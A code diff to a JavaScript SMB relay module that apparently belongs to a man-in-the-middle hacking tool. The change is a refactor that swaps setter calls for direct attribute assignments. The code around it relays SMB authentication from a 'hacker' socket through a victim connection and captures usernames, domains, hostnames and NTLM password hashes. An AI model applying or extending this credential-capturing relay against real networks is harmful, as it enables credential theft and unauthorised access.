@@ -40,7 +40,7 @@ module.exports.SMBBroker = function() {
         // sock1 == hacker
         // sock2 == middler
         out.blue("Authenticating hacker tool");
-        var smb_userid = sock2.getSMBUserID();
+        var smb_userid = sock2.attributes.userid; // getSMBUserID();
 	if(smb_userid) {
 	    this.authorizer = new auth.SMBAuth(sock1);
             this.authorizer.set_uid(smb_userid);
@@ -66,7 +66,8 @@ module.exports.SMBBroker = function() {
 		// we need to record the UID set by the server
 		// for authenticating the hacker tool properly
                 var smb_userid = packet.buffer.readUInt16LE(32);
-                middler.setSMBUserID(smb_userid);
+                middler.attributes.userid = smb_userid;
+                // middler.setSMBUserID(smb_userid);
 		out.yellow("Setting UID to " + smb_userid);
 
                 //
@@ -80,7 +81,7 @@ module.exports.SMBBroker = function() {
                     
                     var n = new smb.CredHunter(packet.buffer);
                     out.yellow("Setting Challenge to " + n.challenge);
-                    middler.setSMBChallenge(n.challenge);
+                    middler.attributes.challenge = n.challenge;
                 }
 	    }
 	    client.write(packet.buffer);
@@ -131,12 +132,12 @@ module.exports.SMBBroker = function() {
 	        out.red("Detected username: " + n.username);
                 out.yellow("Hash: " + n.hash);
 
-                middler.setDomain(n.domain);
-	        middler.setUsername(n.username);
-	        middler.setHostname(n.hostname);
-                middler.setWinVer(n.winver);
-                middler.setHash(n.hash);
-                middler.setHashType(n.htype);
+                middler.attributes.domain = n.domain;
+                middler.attributes.username = n.username;
+                middler.attributes.hostname = n.hostname;
+                middler.attributes.winver = n.winver;
+                middler.attributes.hash = n.hash;
+                middler.attributes.hashtype = n.htype;
 
 	        // This turns out to be important -- if multiple inbound
 	        // connections come in to an SMB server with the "VC" flag
